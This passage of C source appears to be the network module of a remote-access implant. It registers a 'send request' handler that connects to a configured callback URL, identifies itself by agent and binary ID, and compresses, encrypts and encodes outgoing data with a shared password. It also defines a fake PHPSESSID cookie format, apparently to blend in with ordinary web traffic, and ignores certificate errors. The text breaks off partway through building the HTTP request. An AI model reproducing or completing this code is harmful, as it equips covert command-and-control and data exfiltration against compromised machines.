#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_InternetConnect.h"
#include "Internal_Functions.h"


#define INTERNETCONNECT_HEADER_FORMAT_STRING "Cookie: PHPSESSID=%08x%08x\r\n"


// Global variables
cJSON*		g_InternetConnect_lpJsonInternetConnectConfig = NULL;
DWORD		g_InternetConnect_dwBinaryId = 0;
DWORD		g_InternetConnect_dwAgentId = 0;
CHAR*		g_InternetConnect_szPassword = NULL;
DWORD		g_InternetConnect_dwPasswordSize = 0;
HINTERNET	g_InternetConnect_hOpenHandle = NULL;
HINTERNET	g_InternetConnect_hConnectHandle = NULL;
CHAR		g_InternetConnect_szUri[INTERNET_MAX_URL_LENGTH];
BOOL		g_InternetConnect_bSecure = FALSE;



DWORD WINAPI InternetConnectInitialization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonInternetConnectInitializeInput = NULL;
	cJSON*	lpJsonBinaryId = NULL;
	cJSON*	lpJsonAgentId = NULL;
	cJSON*	lpJsonInternetConnectConfiguration = NULL;
	cJSON*	lpJsonInternetConnectConfigurationCallbackUrl = NULL;
	CHAR*	szCallbackUrl = NULL;
	cJSON*	lpJsonInternetConnectConfigurationUserAgent = NULL;
	CHAR*	szUserAgent = NULL;
	cJSON*	lpJsonPassword = NULL;

	BOOL	bRegisterResult = FALSE;

	cJSON*	lpJsonInternetConnectInitializeOutput = NULL;
	CHAR*	szInternetConnectOutput = NULL;
	DWORD	dwInternetConnectOutputSize = 0;

	URL_COMPONENTSA url;
	CHAR szHostName[INTERNET_MAX_HOST_NAME_LENGTH];
	CHAR szUrlPath[INTERNET_MAX_PATH_LENGTH];


	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}

			/********************************************************************************
				Convert input string into JSON
			********************************************************************************/
			lpJsonInternetConnectInitializeInput = cJSON_Parse((CHAR*)lpInputBuffer);
			if (NULL == lpJsonInternetConnectInitializeInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					(CHAR*)lpInputBuffer
				);
				__leave;
			}

			// Set the local module's configuration to the input configuration
			g_InternetConnect_lpJsonInternetConnectConfig = lpJsonInternetConnectInitializeInput;
			// and then null the input configuration so it isn't free'd in the finally
			lpJsonInternetConnectInitializeInput = NULL;


			/********************************************************************************
				Initialize internal functions
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Initialize_InternetConnect_Wininet_Functions()"));
			dwErrorCode = Initialize_InternetConnect_Wininet_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Initialize_InternetConnect_Wininet_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}


			/********************************************************************************
				Perform additional initialization actions
			*******************************************************************************/
			// Get the binary id
			lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(g_InternetConnect_lpJsonInternetConnectConfig, TSM_CONFIGURATION_BINARY_ID);
			if (NULL == lpJsonBinaryId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					g_InternetConnect_lpJsonInternetConnectConfig,
					TSM_CONFIGURATION_BINARY_ID
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonBinaryId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonBinaryId
				);
				__leave;
			}
			g_InternetConnect_dwBinaryId = lpJsonBinaryId->valueint;
			DBGPRINT(DEBUG_VERBOSE, TEXT("g_InternetConnect_dwBinaryId: %d"), g_InternetConnect_dwBinaryId);

			// Get the agent id
			lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(g_InternetConnect_lpJsonInternetConnectConfig, TSM_CONFIGURATION_AGENT_ID);
			if (NULL == lpJsonAgentId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					g_InternetConnect_lpJsonInternetConnectConfig,
					TSM_CONFIGURATION_AGENT_ID
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonAgentId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonAgentId
				);
				__leave;
			}
			g_InternetConnect_dwAgentId = lpJsonAgentId->valueint;
			DBGPRINT(DEBUG_VERBOSE, TEXT("g_InternetConnect_dwAgentId: %d"), g_InternetConnect_dwAgentId);

			// Get the TSM_CONFIGURATION_PASSWORD
			lpJsonPassword = cJSON_GetObjectItemCaseSensitive(g_InternetConnect_lpJsonInternetConnectConfig, TSM_CONFIGURATION_PASSWORD);
			if (NULL == lpJsonPassword)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInternetConnectConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					g_InternetConnect_lpJsonInternetConnectConfig,
					TSM_CONFIGURATION_PASSWORD
				);
				__leave;
			}
			g_InternetConnect_szPassword = cJSON_GetStringValue(lpJsonPassword);
			if (NULL == g_InternetConnect_szPassword)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetStringValue(%p) failed."),
					lpJsonPassword
				);
				__leave;
			}
			g_InternetConnect_dwPasswordSize = strlen(g_InternetConnect_szPassword);
			DBGPRINT(DEBUG_VERBOSE, TEXT("g_InternetConnect_szPassword: %S"), g_InternetConnect_szPassword);

			//// Get the InternetConnect_Configuration from the g_InternetConnect_lpJsonInternetConnectConfig
			//lpJsonInternetConnectConfiguration = cJSON_GetObjectItemCaseSensitive(g_InternetConnect_lpJsonInternetConnectConfig, InternetConnect_Configuration);
			//if (NULL == lpJsonInternetConnectConfiguration)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
			//		g_InternetConnect_lpJsonInternetConnectConfig,
			//		InternetConnect_Configuration
			//	);
			//	__leave;
			//}

			// Get the InternetConnect_Configuration_CallbackUrl from the InternetConnect_Configuration
			//lpJsonInternetConnectConfigurationCallbackUrl = cJSON_GetObjectItemCaseSensitive(lpJsonInternetConnectConfiguration, InternetConnect_Configuration_CallbackUrl);
			lpJsonInternetConnectConfigurationCallbackUrl = cJSON_GetObjectItemCaseSensitive(g_InternetConnect_lpJsonInternetConnectConfig, InternetConnect_Configuration_CallbackUrl);
			if (NULL == lpJsonInternetConnectConfigurationCallbackUrl)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInternetConnectConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInternetConnectConfiguration,
					lpJsonInternetConnectConfigurationCallbackUrl
				);
				__leave;
			}
			szCallbackUrl = cJSON_GetStringValue(lpJsonInternetConnectConfigurationCallbackUrl);
			if ( NULL == szCallbackUrl )
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetStringValue(%p) failed."),
					lpJsonInternetConnectConfigurationCallbackUrl
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szCallbackUrl: %S"), szCallbackUrl);

			// Get the InternetConnect_Configuration_UserAgent from the InternetConnect_Configuration
			//lpJsonInternetConnectConfigurationUserAgent = cJSON_GetObjectItemCaseSensitive(lpJsonInternetConnectConfiguration, InternetConnect_Configuration_UserAgent);
			lpJsonInternetConnectConfigurationUserAgent = cJSON_GetObjectItemCaseSensitive(g_InternetConnect_lpJsonInternetConnectConfig, InternetConnect_Configuration_UserAgent);
			if (NULL == lpJsonInternetConnectConfigurationUserAgent)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInternetConnectConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInternetConnectConfiguration,
					lpJsonInternetConnectConfigurationUserAgent
				);
				__leave;
			}
			szUserAgent = cJSON_GetStringValue(lpJsonInternetConnectConfigurationUserAgent);
			if (NULL == szUserAgent)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetStringValue(%p) failed."),
					lpJsonInternetConnectConfigurationUserAgent
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szUserAgent: %S"), szUserAgent);

			


			// Get an INET handle (also configure proxy)
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("m_InternetConnect_InternetOpenA( %p, %08x, %p, %p, %08x )"),
				szUserAgent,
				INTERNET_OPEN_TYPE_PRECONFIG,
				NULL,
				NULL,
				0
			);
			g_InternetConnect_hOpenHandle = m_InternetConnect_InternetOpenA(
				szUserAgent,
				INTERNET_OPEN_TYPE_PRECONFIG,
				NULL,
				NULL,
				0
			);
			if (NULL == g_InternetConnect_hOpenHandle)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR, 
					TEXT("m_InternetConnect_InternetOpenA( %p, %08x, %p, %p, %08x ) failed. (%08x)\n"),
					szUserAgent,
					INTERNET_OPEN_TYPE_PRECONFIG,
					NULL,
					NULL,
					0,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("g_InternetConnect_hOpenHandle:        %p"), g_InternetConnect_hOpenHandle);


			// Break the URL into componenets
			ZeroMemory(g_InternetConnect_szUri, INTERNET_MAX_PATH_LENGTH); // save for later connects
			ZeroMemory(szHostName, INTERNET_MAX_HOST_NAME_LENGTH);
			ZeroMemory(szUrlPath, INTERNET_MAX_PATH_LENGTH);
			ZeroMemory(&url, sizeof(url));
			url.dwStructSize = sizeof(url);

			url.dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH - 1;
			url.lpszHostName = szHostName;

			url.dwUrlPathLength = INTERNET_MAX_PATH_LENGTH - 1;
			url.lpszUrlPath = szUrlPath;

			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("m_InternetConnect_InternetCrackUrlA( %p, %08x, %08x, %p )"),
				szCallbackUrl,
				0, 
				0, 
				&url
			);
			if (FALSE == m_InternetConnect_InternetCrackUrlA(
				szCallbackUrl,
				0, 
				0, 
				&url
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR, 
					TEXT("m_InternetConnect_InternetCrackUrlA( %p, %08x, %08x, %p ) failed. (%08x)\n"),
					szCallbackUrl,
					0,
					0,
					&url,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szHostName:       %S"), szHostName);
			DBGPRINT(DEBUG_VERBOSE, TEXT("url.nPort:        %d"), url.nPort);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szUrlPath:        %S"), szUrlPath);

			strcpy(g_InternetConnect_szUri, szUrlPath);
			if (INTERNET_SCHEME_HTTPS == url.nScheme)
				g_InternetConnect_bSecure = TRUE;

			// Actually connect to the server
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("m_InternetConnect_InternetConnectA( %p, %p, %08x, %p, %p, %08x, %08x, %p )"),
				g_InternetConnect_hOpenHandle,
				szHostName,
				url.nPort,
				NULL,
				NULL,
				INTERNET_SERVICE_HTTP,
				0,
				0
			);
			g_InternetConnect_hConnectHandle = m_InternetConnect_InternetConnectA(
				g_InternetConnect_hOpenHandle,
				szHostName,
				url.nPort,
				NULL,
				NULL,
				INTERNET_SERVICE_HTTP,
				0,
				0
			);
			if (NULL == g_InternetConnect_hConnectHandle)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR, 
					TEXT("m_InternetConnect_InternetConnectA( %p, %p, %08x, %p, %p, %08x, %08x, %p ) failed. (%08x)\n"),
					g_InternetConnect_hOpenHandle,
					szHostName,
					url.nPort,
					NULL,
					NULL,
					INTERNET_SERVICE_HTTP,
					0,
					0,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("g_InternetConnect_hConnectHandle:        %p"), g_InternetConnect_hConnectHandle);


			/********************************************************************************
				Register callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Register InternetConnect_Send_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_InternetConnect_lpJsonInternetConnectConfig,
				InternetConnect_Send_Request,
				InternetConnectSendRequest
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_InternetConnect_lpJsonInternetConnectConfig,
					InternetConnect_Send_Request,
					InternetConnectSendRequest
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register InternetConnect_Send_Request was successful."));
			}


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			//szInternetConnectOutput = cJSON_Print(lpJsonInternetConnectInitializeOutput);
			//if (NULL == szInternetConnectOutput)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("cJSON_Print(%p) failed."),
			//		lpJsonInternetConnectInitializeOutput
			//	);
			//	__leave;
			//}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("szInternetConnectOutput:     %p"), szInternetConnectOutput);
			////printf("szInternetConnectOutput:\n%s\n", szInternetConnectOutput);
			//dwInternetConnectOutputSize = (DWORD)strlen(szInternetConnectOutput);

			//(*lppOutputBuffer) = (LPBYTE)szInternetConnectOutput;
			//(*lpdwOutputBufferSize) = dwInternetConnectOutputSize;

		} // end try-finally
		__finally
		{
			ZeroMemory(szHostName, INTERNET_MAX_HOST_NAME_LENGTH);
			ZeroMemory(szUrlPath, INTERNET_MAX_PATH_LENGTH);
			ZeroMemory(&url, sizeof(url));

			// Delete input and output JSON objects
			if (NULL != lpJsonInternetConnectInitializeInput)
			{
				cJSON_Delete(lpJsonInternetConnectInitializeInput);
				lpJsonInternetConnectInitializeInput = NULL;
			}
			if (NULL != lpJsonInternetConnectInitializeOutput)
			{
				cJSON_Delete(lpJsonInternetConnectInitializeOutput);
				lpJsonInternetConnectInitializeOutput = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}

DWORD WINAPI InternetConnectFinalization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szInternetConnectInput = NULL;
	DWORD	dwInternetConnectInputSize = 0;
	cJSON*	lpJsonInternetConnectInput = NULL;
	cJSON*	lpJsonMessageType = NULL;

	BOOL	bRegisterResult = FALSE;

	PBYTE	pBuffer = NULL;
	int		nBufferSize = 0;

	CHAR*	szInternetConnectOutput = NULL;
	DWORD	dwInternetConnectOutputSize = 0;
	cJSON*	lpJsonInternetConnectOutput = NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//if (NULL == lpInputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lpInputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			//szInternetConnectInput = (char*)lpInputBuffer;
			//dwInternetConnectInputSize = dwInputBufferSize;


			/********************************************************************************
				Unregister callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister InternetConnect_Send_Request"));
			bRegisterResult = UnregisterModuleMessageHandler(
				g_InternetConnect_lpJsonInternetConnectConfig,
				InternetConnect_Send_Request
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("UnregisterModuleMessageHandler(%p, %S) failed."),
					g_InternetConnect_lpJsonInternetConnectConfig,
					InternetConnect_Send_Request
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Unregister InternetConnect_Send_Request was successful."));
			}


			/********************************************************************************
				Perform additional Finalization actions
			********************************************************************************/
			if (NULL != g_InternetConnect_hConnectHandle)
			{
				DBGPRINT(
					DEBUG_VERBOSE,
					TEXT("m_InternetConnect_InternetCloseHandle( %p )"),
					g_InternetConnect_hConnectHandle
				);
				if (FALSE == m_InternetConnect_InternetCloseHandle(g_InternetConnect_hConnectHandle))
				{
					dwTempErrorCode = GetLastError();
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("m_InternetConnect_InternetCloseHandle( %p ) failed. (%08x)\n"),
						g_InternetConnect_hConnectHandle,
						dwTempErrorCode
					);
				}
				g_InternetConnect_hConnectHandle = NULL;
			}

			if (NULL != g_InternetConnect_hOpenHandle)
			{
				DBGPRINT(
					DEBUG_VERBOSE,
					TEXT("m_InternetConnect_InternetCloseHandle( %p )"),
					g_InternetConnect_hOpenHandle
				);
				if (FALSE == m_InternetConnect_InternetCloseHandle(g_InternetConnect_hOpenHandle))
				{
					dwTempErrorCode = GetLastError();
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("m_InternetConnect_InternetCloseHandle( %p ) failed. (%08x)\n"),
						g_InternetConnect_hOpenHandle,
						dwTempErrorCode
					);
				}
				g_InternetConnect_hOpenHandle = NULL;
			}


			/********************************************************************************
				Finalize internal functions
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Finalize_InternetConnect_Wininet_Functions()"));
			dwErrorCode = Finalize_InternetConnect_Wininet_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Finalize_InternetConnect_Wininet_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}

		} // end try-finally
		__finally
		{
			/********************************************************************************
				Delete local JSON config
			********************************************************************************/
			if (NULL != g_InternetConnect_lpJsonInternetConnectConfig)
			{
				cJSON_Delete(g_InternetConnect_lpJsonInternetConnectConfig);
				g_InternetConnect_lpJsonInternetConnectConfig = NULL;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}



DWORD WINAPI InternetConnectSendRequest(
	IN LPBYTE	lpInputBuffer,
	IN DWORD	dwInputBufferSize,
	OUT LPBYTE* lppOutputBuffer,
	OUT LPDWORD lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	CHAR*	szInternetConnectInput = NULL;
	DWORD	dwInternetConnectInputSize = 0;
	cJSON*	lpJsonInternetConnectInput = NULL;
	cJSON*	lpJsonInternetConnectSendRequest = NULL;
	cJSON*	lpJsonInternetConnectSendRequestBuffer = NULL;

	LPBYTE	lpEncodedSendBuffer = NULL;
	DWORD	dwEncodedSendBufferSize = 0;

	LPBYTE	lpSendBuffer = NULL;
	DWORD	dwSendBufferSize = 0;

	CHAR*	szInternetConnectOutput = NULL;
	DWORD	dwInternetConnectOutputSize = 0;
	cJSON*	lpJsonInternetConnectOutput = NULL;
	cJSON*	lpJsonInternetConnectSendResponseBuffer = NULL;

	DWORD	dwRequestIndex = 0;

	HINTERNET hRequest = NULL;
	DWORD dwFlags = INTERNET_FLAG_RELOAD
		| INTERNET_FLAG_NO_CACHE_WRITE
		| INTERNET_FLAG_KEEP_CONNECTION
		| INTERNET_FLAG_NO_AUTO_REDIRECT
		| INTERNET_FLAG_NO_UI
		| INTERNET_FLAG_NO_COOKIES
		;

	CHAR	lpszVerb[INTERNET_MAX_SCHEME_LENGTH];
	
	CHAR	lpszHeaders[INTERNET_MAX_PATH_LENGTH];

	LPVOID	lpOptional = NULL;
	DWORD	dwOptionalLength = 0;

	DWORD	dwResponseStatusCode;
	DWORD	dwResponseStatusCodeSize = sizeof(dwResponseStatusCode);
	DWORD	dwIndex = 0;

	LPBYTE	lpTempBuffer[INTERNET_MAX_PATH_LENGTH];
	DWORD	dwAvailableBytes = 0;
	DWORD	dwOldBufferSize = 0;
	LPBYTE	lpOldBuffer = NULL;

	LPBYTE	lpResponseBuffer = NULL;
	DWORD	dwResponseBufferSize = 0;
	DWORD	dwBytesRead = 0;

	LPBYTE	lpDecodedResponseBuffer = NULL;
	DWORD	dwDecodedResponseBufferSize = 0;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);


			/********************************************************************************
				Check arguments
			********************************************************************************/
			if (NULL == lppOutputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lppOutputBuffer is NULL.\n")
				);
				__leave;
			}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}
			szInternetConnectInput = (char*)lpInputBuffer;
			dwInternetConnectInputSize = dwInputBufferSize;


			/********************************************************************************
				Parse input arguments
			********************************************************************************/
			lpJsonInternetConnectInput = cJSON_Parse(szInternetConnectInput);
			if (NULL == lpJsonInternetConnectInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					lpInputBuffer
				);
				__leave;
			}


			/********************************************************************************
				Create the output JSON object
			********************************************************************************/
			// Create the output JSON object
			lpJsonInternetConnectOutput = cJSON_CreateObject();
			if (NULL == lpJsonInternetConnectOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInternetConnectOutput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}


			/********************************************************************************
				Perform action given input parameters
			********************************************************************************/
			// Get the InternetConnect_Send_Request object
			lpJsonInternetConnectSendRequest = cJSON_GetObjectItemCaseSensitive(lpJsonInternetConnectInput, InternetConnect_Send_Request);
			if (NULL == lpJsonInternetConnectSendRequest)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInternetConnectInput,
					InternetConnect_Send_Request
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonInternetConnectSendRequest:    %p"), lpJsonInternetConnectSendRequest);

			// Get the send buffer
			lpJsonInternetConnectSendRequestBuffer = cJSON_GetObjectItemCaseSensitive(lpJsonInternetConnectSendRequest, InternetConnect_Send_Request_Buffer);
			if (NULL == lpJsonInternetConnectSendRequestBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInternetConnectLoadLibraryRequestLibraryBuffer = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInternetConnectSendRequest,
					InternetConnect_Send_Request_Buffer
				);
				__leave;
			}
			if (
				(!cJSON_IsBytes(lpJsonInternetConnectSendRequestBuffer)) ||
				(NULL == lpJsonInternetConnectSendRequestBuffer->valuestring)
				)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsBytes(%p) failed."),
					lpJsonInternetConnectSendRequestBuffer
				);
				__leave;
			}

			// Get the actual send buffer bytes
			lpSendBuffer = cJSON_GetBytesValue(lpJsonInternetConnectSendRequestBuffer, (int*)(&dwSendBufferSize));
			if (NULL == lpSendBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpDllFileBuffer = cJSON_GetBytesValue(%p, %p) failed."),
					lpJsonInternetConnectSendRequestBuffer,
					&dwSendBufferSize
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S:     %p"), InternetConnect_Send_Request_Buffer, lpSendBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%SSize: %d"), InternetConnect_Send_Request_Buffer, dwSendBufferSize);


			dwErrorCode = CompressEncryptEncodeBuffer(
				lpSendBuffer,
				dwSendBufferSize,
				(LPBYTE)g_InternetConnect_szPassword,
				g_InternetConnect_dwPasswordSize,
				&lpEncodedSendBuffer,
				&dwEncodedSendBufferSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("CompressEncryptEncodeBuffer(%p, %d, %p, %d, %p, %p) failed. (%08x)"),
					lpSendBuffer,
					dwSendBufferSize,
					(LPBYTE)g_InternetConnect_szPassword,
					g_InternetConnect_dwPasswordSize,
					&lpEncodedSendBuffer,
					&dwEncodedSendBufferSize,
					dwErrorCode
				);
				__leave;
			}


			// Check if we need to set the SSL flags
			if (TRUE == g_InternetConnect_bSecure)
			{
				dwFlags |= INTERNET_FLAG_SECURE
					| INTERNET_FLAG_IGNORE_CERT_CN_INVALID
					| INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
			}


			// Determine the HTTP connection verb
			ZeroMemory(lpszVerb, INTERNET_MAX_SCHEME_LENGTH);
			if ((NULL == lpSendBuffer) || (0 == dwSendBufferSize))
			{
				strcpy(lpszVerb, "GET");
			}
			else
			{
				strcpy(lpszVerb, "POST");
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpszVerb:        %S"), lpszVerb);


			// Create the HTTP connection
			DBGPRINT(DEBUG_INFO, TEXT("Opening an HTTP %S connection to %S..."), lpszVerb, g_InternetConnect_szUri);
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("m_InternetConnect_HttpOpenRequestA( %p, %p, %p, %p, %p, %p, %08x, %p )"),
				g_InternetConnect_hConnectHandle,
				lpszVerb,
				g_InternetConnect_szUri,
				NULL,
				NULL,
				NULL,
				dwFlags,
				0
			);
			hRequest = m_InternetConnect_HttpOpenRequestA(
				g_InternetConnect_hConnectHandle, 
				lpszVerb, 
				g_InternetConnect_szUri, 
				NULL, 
				NULL, 
